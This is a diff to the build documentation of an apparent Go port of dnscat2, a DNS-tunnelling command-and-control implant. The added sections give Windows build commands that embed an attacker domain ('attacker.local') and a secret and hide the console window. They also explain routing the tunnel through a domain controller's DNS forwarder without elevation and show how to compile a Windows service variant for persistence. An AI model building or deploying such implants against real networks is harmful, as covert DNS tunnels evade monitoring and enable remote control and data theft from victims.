@@ -25,7 +25,22 @@ go build -ldflags="-s -w \
 
 ## Examples
 
-**Windows (hidden window):**
+**Windows — domain mode (DNS server auto-detected from registry, recommended for domain-joined targets):**
+
+```bash
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
+  -X main.DefaultDomain=attacker.local \
+  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
+  -o dnscat2.exe ./cmd/dnscat/
+```
+
+The binary reads the DNS resolver IP at runtime from
+`HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer`.
+On a domain-joined machine this returns the DC's IP, routing tunnel traffic
+through the internal DNS forwarder. Requires a conditional forwarder on the DC
+for `attacker.local` pointing to the attacker's dnscat2 server.
+
+**Windows — direct mode (hardcoded server IP, use when target is NOT domain-joined or DNS forwarder is not available):**
 
 ```bash
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
@@ -133,3 +148,38 @@ go build -ldflags="-s -w -X main.DefaultDnsServer=10.0.0.1 -X main.DefaultSecret
 - Payload runs standalone without arguments
 - All variables are optional
 - Empty string = use original default behavior
+
+## Windows DNS Auto-Detection
+
+When neither `DefaultServer` nor `--dns-server` is provided, the Windows binary
+enumerates TCP/IP interface registry keys to find the configured DNS server:
+
+```
+HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\
+  NameServer      (static DNS — checked first)
+  DhcpNameServer  (DHCP-assigned DNS — checked as fallback)
+```
+
+First non-empty, non-`0.0.0.0` value across all GUIDs is used. On domain-joined
+machines this is typically the DC's IP. No elevation required (`KEY_READ` is
+accessible to any user including machine accounts).
+
+To manually verify what value the binary would pick at runtime:
+
+```text
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /s /v NameServer
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /s /v DhcpNameServer
+```
+
+## Windows Service (`dnscat-service`)
+
+All files in `cmd/dnscat-service/` carry a `//go:build windows` tag — the
+package imports `golang.org/x/sys/windows/svc` and
+`golang.org/x/sys/windows/registry` which are Windows-only. Cross-compiling
+from Linux/macOS requires `GOOS=windows`:
+
+```bash
+GOOS=windows GOARCH=amd64 go build \
+  -ldflags="-s -w -X main.DefaultDnsServer=10.12.10.10 -X main.DefaultSecret=..." \
+  -o dnscat2-svc.exe ./cmd/dnscat-service/
+```
